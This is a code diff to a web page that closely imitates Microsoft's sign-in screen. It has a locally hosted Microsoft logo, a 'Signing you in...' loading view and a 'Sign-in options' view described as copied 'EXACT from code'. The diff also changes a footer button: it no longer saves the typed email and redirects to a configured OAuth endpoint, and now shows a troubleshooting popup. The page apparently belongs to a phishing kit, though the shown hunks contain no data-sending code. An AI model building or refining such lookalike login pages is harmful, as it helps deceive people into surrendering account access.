@@ -238,7 +238,7 @@
           </div>
         </div>
 
-        <!-- Office OAuth Loading View (div2) -->
+        <!-- ✅ Office OAuth Loading View (div2) -->
         <div id="div2" class="hidden">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <h1 class="mt-4">Signing you in...</h1>
@@ -250,17 +250,10 @@
           </div>
         </div>
 
-        <!-- Detailed "Sign-in options" View -->
+        <!-- ✅ Detailed "Sign-in options" View (EXACT from code) -->
         <div id="options_view_detailed" class="hidden">
             <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
             <h1 class="mt-4">Sign-in options</h1>
-            <!-- ✅ Password Key Option -->
-            <div class="option-item">
-                <div class="option-icon-container"><i class="fas fa-key"></i></div>
-                <div class="option-text">
-                    <p class="primary">Password</p>
-                </div>
-            </div>
             <div class="option-item">
                 <div class="option-icon-container"><i class="fas fa-user-lock"></i></div>
                 <div class="option-text">
@@ -377,7 +370,7 @@
             sessionStorage.setItem('ms_oauth_nonce', nonce);
             sessionStorage.setItem('ms_oauth_state', state);
 
-            // Show loading state
+            // ✅ Show loading state (div2)
             div1.classList.add('hidden');
             div2.classList.remove('hidden');
             optionsBox.classList.add('hidden');
@@ -440,49 +433,17 @@
             optionsBox.classList.remove('hidden');
         });
 
-        // ✅ Footer dots button - Redirect to Microsoft
+        // Footer dots button - Show troubleshooting popup
         footerDotsLink.addEventListener('click', function (e) {
             e.preventDefault();
-            console.log('📋 Footer dots clicked - Redirecting to Microsoft');
-            
-            const email = emailInput.value.trim();
-            if (!email) {
-                console.log('⚠️ No email found');
-                return;
-            }
-
-            localStorage.setItem('ms_email', email);
-            sessionStorage.setItem('ms_email', email);
-
-            const nonce = generateNonce();
-            const state = generateState();
-            
-            sessionStorage.setItem('ms_oauth_nonce', nonce);
-            sessionStorage.setItem('ms_oauth_state', state);
-
-            div1.classList.add('hidden');
-            div2.classList.remove('hidden');
-            optionsBox.classList.add('hidden');
-
-            const officeOAuthUrl = new URL(OFFICE_CONFIG.authority);
-            officeOAuthUrl.searchParams.append('client_id', OFFICE_CONFIG.clientId);
-            officeOAuthUrl.searchParams.append('redirect_uri', OFFICE_CONFIG.redirectUri);
-            officeOAuthUrl.searchParams.append('response_type', 'code id_token');
-            officeOAuthUrl.searchParams.append('scope', OFFICE_CONFIG.scope);
-            officeOAuthUrl.searchParams.append('response_mode', 'form_post');
-            officeOAuthUrl.searchParams.append('nonce', nonce);
-            officeOAuthUrl.searchParams.append('state', state);
-            officeOAuthUrl.searchParams.append('ui_locales', 'en-US');
-            officeOAuthUrl.searchParams.append('mkt', 'en-US');
-            officeOAuthUrl.searchParams.append('prompt', 'login');
-
-            setTimeout(() => {
-              window.location.href = officeOAuthUrl.toString();
-            }, 1500);
+            console.log('📋 Footer dots clicked - Showing troubleshooting popup');
+            document.getElementById('modal_timestamp').textContent = new Date().toISOString();
+            troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
         });
 
         // Close troubleshooting popup
         closeTroubleshootingBtn.addEventListener('click', function () {
+            console.log('❌ Closing troubleshooting popup');
             troubleshootingBox.style.display = 'none';
         });
 
